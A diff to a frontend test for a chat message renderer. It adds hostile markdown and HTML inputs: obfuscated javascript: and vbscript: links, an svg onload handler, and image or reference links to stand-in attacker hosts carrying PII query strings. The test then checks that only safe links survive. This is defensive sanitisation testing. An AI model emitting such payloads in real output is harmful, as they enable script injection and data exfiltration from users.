@@ -33,15 +33,32 @@ describe("MessageView", () => {
       "![](https://attacker.test/?q=pii)",
       "[a](javascript:alert(1))",
       "[b](data:text/html;base64,xx)",
+      "<javascript:alert(1)>",
+      "[c][ref]\n\n[ref]: javascript:alert(1)",
+      "![d][img]\n\n[img]: https://attacker.test/ref.png",
+      "[e](JaVaScRiPt:alert(1))",
+      "[f](&#106;avascript:alert(1))",
+      "[g](vbscript:msgbox(1))",
+      "[x](xmpp:attacker@evil.test)",
+      "[y](blob:https://evil.test/1234)",
+      "[h](//attacker.test/x)",
+      '<a href="javascript:alert(1)">i</a>',
+      '<svg onload="alert(1)"></svg>',
+      "[ ](https://attacker.test/blank)",
       "[loja](https://emporio.test/politicas)",
+      "[site](http://emporio.test/)",
+      "[email](mailto:sac@emporio.test)",
     ].join("\n\n");
     const { container } = render(<MessageView message={assistant(hostile)} />);
 
-    expect(container.querySelector("img, iframe, script")).toBeNull();
+    expect(container.querySelector("img, iframe, script, svg")).toBeNull();
     expect(container).not.toHaveTextContent(/blocked/i);
-    for (const anchor of container.querySelectorAll("a")) {
-      expect(anchor.getAttribute("href") ?? "").not.toMatch(/^(javascript|data):/i);
-    }
+    const hrefs = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
+    expect(hrefs).toEqual([
+      "https://emporio.test/politicas",
+      "http://emporio.test/",
+      "mailto:sac@emporio.test",
+    ]);
     const safe = screen.getByRole("link", { name: "loja" });
     expect(safe).toHaveAttribute("href", "https://emporio.test/politicas");
     expect(safe).toHaveAttribute("target", "_blank");
